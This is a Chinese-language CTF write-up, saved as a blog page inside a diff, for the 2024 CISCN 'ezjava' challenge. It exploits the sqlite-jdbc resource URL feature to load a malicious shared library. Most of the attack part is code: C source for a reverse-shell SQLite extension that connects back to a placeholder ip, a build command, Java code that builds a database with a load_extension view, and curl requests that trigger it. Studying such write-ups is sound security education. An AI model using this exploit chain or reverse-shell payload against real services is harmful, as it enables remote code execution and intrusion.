@@ -1,0 +1,348 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>2024CISCN初赛 | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="2024CISCN初赛ezjava
+JDBC-Attack-SQLite加载恶意so文件
+
+
+分析JdbcController，com.example.jdbctest.controller.JdbcController#connect
+12345678910@RequestMapping(&amp;#123;&amp;quot;/connect&amp;quot;&amp;#125;)@ResponseBodypublic ResultBean connect(@RequestBody JdbcBean jdbcBean) &amp;#123;    try &amp;#123;        return new ResultBean(1, String.join(&amp;quot;,&amp;quot;, this.datasourceServiceImpl.testDatasourceConnectionAble(jdbcBean)));    &amp;#125; catch (Exception var3) &amp;#123;        return new ResultBean(0, &amp;quot;连接失败&amp;quot;);    &amp;#125;&amp;#125;
+
+实例化连接测试，跟进com.example.jdbctest.services.datasourceServiceImpl#testDatasourceConnectionAble
+1234567891011121314151617181920212223242526272829303132333435public String[] testDatasourceConnectionAble(JdbcBean jdbcBean) throws ClassNotFoundException, SQLException &amp;#123;    DatasourceLoadConfig var10000 = this.datasourceLoadConfig;    Map&amp;lt;String, String&amp;gt; config = DatasourceLoadConfig.getConfig();    switch (jdbcBean.getType()) &amp;#123;        case 1:            Class.forName((String)config.get(&amp;quot;JDBC-MYSQL&amp;quot;));            MysqlDatasourceConnector mysqlDatasourceConnector = new MysqlDatasourceConnector(DriverManager.getConnection(jdbcBean.getUrl()));            if (jdbcBean.getTableName() != null) &amp;#123;                return mysqlDatasourceConnector.getTableContent(jdbcBean.getTableName());            &amp;#125;            return mysqlDatasourceConnector.getTables();        case 2:            Class.forName((String)config.get(&amp;quot;JDBC-POSTGRES&amp;quot;));            PostgresDatasourceConnector postgresDatasourceConnector = new PostgresDatasourceConnector(DriverManager.getConnection(jdbcBean.getUrl()));            if (jdbcBean.getTableName() != null) &amp;#123;                return postgresDatasourceConnector.getTableContent(jdbcBean.getTableName());            &amp;#125;            return postgresDatasourceConnector.getTables();        case 3:            SqliteDatasourceConnector sqliteDatasourceConnector = new SqliteDatasourceConnector(jdbcBean.getUrl());            if (jdbcBean.getTableName() != null) &amp;#123;                return sqliteDatasourceConnector.getTableContent(jdbcBean.getTableName());            &amp;#125;            return sqliteDatasourceConnector.getTables();        case 4:            Class.forName((String)config.get(&amp;quot;JDBC-SQLITE&amp;quot;));            return new String[]&amp;#123;&amp;quot;&amp;quot;&amp;#125;;        default:            return new String[]&amp;#123;&amp;quot;&amp;quot;&amp;#125;;    &amp;#125;&amp;#125;
+
+根据sqliteDatasourceConnector.getTableContent，跟进到com.example.jdbctest.services.DatasourceServiceImpl#getTableContent
+123456789101112131415161718192021public String[] getTableContent(String tableName) &amp;#123;    String sql = &amp;quot;select * from &amp;quot; + tableName;    try &amp;#123;        // 创建了一个Statement对象，Statement是JDBC API中用于执行SQL语句和查询数据库的一个类        Statement statement = this.connection.createStatement();        Throwable var4 = null;        try &amp;#123;            // 执行SQL查询            ResultSet resultSet = statement.executeQuery(sql);            Throwable var6 = null;            // ...        &amp;#125; // catch        // ...    &amp;#125; // catch        return new String[0];&amp;#125;"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="2024CISCN初赛"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 2024CISCN初赛</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="2024CISCN初赛"><a href="#2024CISCN初赛" class="headerlink" title="2024CISCN初赛"></a>2024CISCN初赛</h1><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><blockquote>
+<p>JDBC-Attack-SQLite加载恶意so文件</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1727236081282.png" alt="image-20240525171429854"></p>
+<p>分析JdbcController，<code>com.example.jdbctest.controller.JdbcController#connect</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/connect&quot;&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> ResultBean <span class="title function_">connect</span><span class="params">(<span class="meta">@RequestBody</span> JdbcBean jdbcBean)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(<span class="number">1</span>, String.join(<span class="string">&quot;,&quot;</span>, <span class="built_in">this</span>.datasourceServiceImpl.testDatasourceConnectionAble(jdbcBean)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(<span class="number">0</span>, <span class="string">&quot;连接失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>实例化连接测试，跟进<code>com.example.jdbctest.services.datasourceServiceImpl#testDatasourceConnectionAble</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] testDatasourceConnectionAble(JdbcBean jdbcBean) <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">    <span class="type">DatasourceLoadConfig</span> <span class="variable">var10000</span> <span class="operator">=</span> <span class="built_in">this</span>.datasourceLoadConfig;</span><br><span class="line">    Map&lt;String, String&gt; config = DatasourceLoadConfig.getConfig();</span><br><span class="line">    <span class="keyword">switch</span> (jdbcBean.getType()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-MYSQL&quot;</span>));</span><br><span class="line">            <span class="type">MysqlDatasourceConnector</span> <span class="variable">mysqlDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MysqlDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> mysqlDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> mysqlDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-POSTGRES&quot;</span>));</span><br><span class="line">            <span class="type">PostgresDatasourceConnector</span> <span class="variable">postgresDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PostgresDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> postgresDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> postgresDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="type">SqliteDatasourceConnector</span> <span class="variable">sqliteDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqliteDatasourceConnector</span>(jdbcBean.getUrl());</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> sqliteDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sqliteDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-SQLITE&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据<code>sqliteDatasourceConnector.getTableContent</code>，跟进到<code>com.example.jdbctest.services.DatasourceServiceImpl#getTableContent</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] getTableContent(String tableName) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from &quot;</span> + tableName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建了一个Statement对象，Statement是JDBC API中用于执行SQL语句和查询数据库的一个类</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> <span class="built_in">this</span>.connection.createStatement();</span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 执行SQL查询</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; <span class="comment">// catch</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125; <span class="comment">// catch</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>思路：利用JDBC-Attack-SQLite加载恶意so文件</p>
+<p>sqlite-jdbc-3.8.9.jar库中<code>org.sqlite.core.CoreConnection#extractResource</code></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1727236081740.png" alt="image-20240525215445968"></p>
+<p>这个方法从URL连接获取数据库内容，生成在&#x2F;tmp&#x2F;sqlite-jdbc-tmp-*.db，根据<code>resourceAddr.hashCode()</code>知道生成文件名的方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://ip/evil.so&quot;</span>).hashCode());</span><br></pre></td></tr></table></figure>
+
+<p>恶意文件生成 <code>c -&gt; so</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> tcp_port = <span class="number">7777</span>;</span><br><span class="line"><span class="type">char</span> *ip = <span class="string">&quot;ip&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sqlite3_extension_init</span><span class="params">(sqlite3 *db,<span class="type">char</span> **pzErrMsg,<span class="type">const</span> sqlite3_api_routines *pApi)</span>&#123;</span><br><span class="line">  <span class="type">int</span> rc = SQLITE_OK;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(tcp_port);</span><br><span class="line">    addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">    fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( connect(fd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dup2(fd, <span class="number">0</span>);</span><br><span class="line">    dup2(fd, <span class="number">1</span>);</span><br><span class="line">    dup2(fd, <span class="number">2</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编译成so文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fPIC -shared evil.c -o evil.so</span><br></pre></td></tr></table></figure>
+
+<p>然后需要执行<code>CREATE VIEW security as SELECT ( SELECT load_extension(&#39;/tmp/sqlite-jdbc-tmp-*.db&#39;));</code>去加载恶意的so文件</p>
+<p>生成db文件代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jdbctest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filedb</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">dbFile</span> <span class="operator">=</span> <span class="string">&quot;E:/poc.db&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dbFile);</span><br><span class="line">            Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite:&quot;</span>+dbFile);</span><br><span class="line">            System.out.println(<span class="string">&quot;Opened database successfully&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;CREATE VIEW security as SELECT ( SELECT load_extension(&#x27;/tmp/sqlite-jdbc-tmp-*.db&#x27;));&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">preStmt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">            preStmt.executeUpdate();</span><br><span class="line">            preStmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>开启监听，curl发包</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl --header &quot;Content-Type: application/json&quot;  --request POST  --data &#x27;&#123;&quot;type&quot;: 3,&quot;url&quot;: &quot;jdbc:sqlite::resource:http://ip/evil.so&quot;&#125;&#x27; http://ip/jdbc/connect</span><br><span class="line"></span><br><span class="line"> curl --header &quot;Content-Type: application/json&quot;  --request POST  --data &#x27;&#123;&quot;type&quot;: 3,&quot;url&quot;: &quot;jdbc:sqlite::resource:http://ip/poc.db&quot;,&quot;tableName&quot;: &quot;security&quot;&#125;&#x27; http://ip/jdbc/connect</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/07/20/writeup/htb/HTB Cap/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/05/22/writeup/htb/HTB BoardLight/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-06-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Writeup/">Writeup<span>13</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CISCN/">CISCN<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#2024CISCN%E5%88%9D%E8%B5%9B"><span class="toc-article-text">2024CISCN初赛</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ezjava"><span class="toc-article-text">ezjava</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
